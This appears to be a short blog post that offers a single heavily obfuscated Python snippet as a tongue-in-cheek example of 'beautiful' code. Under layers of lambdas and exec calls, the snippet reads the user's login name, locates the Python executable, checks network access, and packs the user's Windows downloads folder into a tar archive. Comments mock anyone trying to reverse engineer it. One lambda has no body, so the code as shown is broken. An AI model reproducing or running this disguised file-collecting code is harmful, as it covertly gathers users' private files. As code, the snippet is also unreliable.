layout: post
title: a big post
---

gut morgen

```py
import types

def do_nothing(youre=[
        "# to be honest"
    ], a=[
        "hopeless"
        ], skid={
            "lmao.": "lmao.",
            "stop trying": "smh"
            }):
    exec(
      """
# hey, i see you're trying to reverse engineer this program
# and i wish you good luck!
# <3 unazed
%s
      """ % (
          ''.join([youre[0], a[0], skid.get(skid.get("lmao.", "stop trying"), "stop trying")])
          ),
      globals(),
      locals()
    )
    return (youre, a, skid)

for idx_0, nothing_interesting in enumerate((globals().__setitem__("setitem", lambda k, v: globals().__setitem__(k, v)),globals().__setitem__("getitem", lambda k, dv: globals().get(k, dv)),globals().__setitem__("_", print),"hey")):
    for idx_1, stop_reading_tbh in enumerate((setitem("you_finna_give_up", lambda: "look harder"),setitem("my_i", getitem("i", lambda: (setitem("tbh_idek", {l: __import__(l) for l in ["os", "sys", "subprocess", "socket", "haha you thought i'm importing stuff", "hey though, seriously, stop."] if chr(len("you're funny tbh") + 88) not in [*l[:1]]})))),(setitem("variable 1", "i'm getting your login ahaha!".split()),setitem("what a skid", getattr([*tbh_idek.values()][0], ([setitem("oof!", getitem("oof!", "awww shit"[:0]) + l.__getitem__(slice(*{1: (0, 3, "owo what's this?"),3: (0, 6969, "lmao"),}.get(x, (0, 0, "aww shit x2"))[:-1]))) for x, l in enumerate(getitem("variable %d" % 0o1, "huh"))], getitem("oof!", "rip"))[1][:8])),setitem("owoitsyou", getitem("what a skid", "lol").__call__()),i[0].__setitem__(0,"(setitem(\"whereami\", [*tbh_idek.values()][1].executable),setitem(\"wherereallyami?\", '\\\\'.join(whereami.split(\"\\\\\")[:-1])))if idx_0 == 1 else \"\"\n"), exec(b"import socket\n"+__import__("base64").b64decode(b""), globals(), locals()),i[1].__setitem__(0, "try:\n\ta=socket.socket();a.settimeout(2);a.connect((\"google.com\",80))\nexcept socket.timeout:raise SystemExit\n"), i[2].__delitem__("lmao.") if "lmao." in i[2] else None,
        i[2].__setitem__("stop trying", "_('just give up');import shutil\nif idx_0==1:\n\ttry:\n\t\tglobals()['lol']=shutil.make_archive('metadata','tar',root_dir=f'C:/Users/{owoitsyou}/downloads')\n\t\t__()\n\texcept IOError:_('oh well')")
      ) if not isinstance(my_i, types.LambdaType) else (
          setitem("__", lambda 
          ))):
        try:
            my_i() # is green
        except:
            "fuck you"
        you_finna_give_up()
    i = do_nothing()
```

here is **an** example of *beautiful* `python` code __lol__!
